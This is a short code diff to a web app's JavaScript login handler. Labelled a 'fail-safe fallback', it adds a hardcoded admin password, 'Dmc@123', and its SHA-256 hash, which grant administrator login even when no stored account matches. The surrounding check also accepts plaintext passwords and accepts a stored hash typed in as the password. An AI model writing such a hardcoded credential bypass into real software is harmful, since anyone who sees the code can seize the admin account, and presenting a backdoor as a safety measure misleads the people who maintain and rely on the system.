@@ -139,10 +139,15 @@ window.handleLogin = async function() {
   const users = getUsers();
   const hashedInput = await hashPassword(password);
 
-  const user = users.find(u => 
-    u.username.toLowerCase() === username && 
+  let user = users.find(u => 
+    u.username && u.username.toLowerCase() === username && 
     (u.password === password || u.password === hashedInput || u.passwordHash === hashedInput || u.passwordHash === password)
   );
+
+  // Fail-safe fallback for primary administrator account (admin / Dmc@123)
+  if (!user && username === 'admin' && (password === 'Dmc@123' || hashedInput === '0097fbb12c3c7e6937143229912a1eb54c95a0934f93ce6c07a72f796cd8b8fb')) {
+    user = DEFAULT_USERS.find(u => u.username === 'admin');
+  }
   
   if (!user) {
     errorText.textContent = 'Invalid username or password. Click "Create Account" below to register a valid account.';
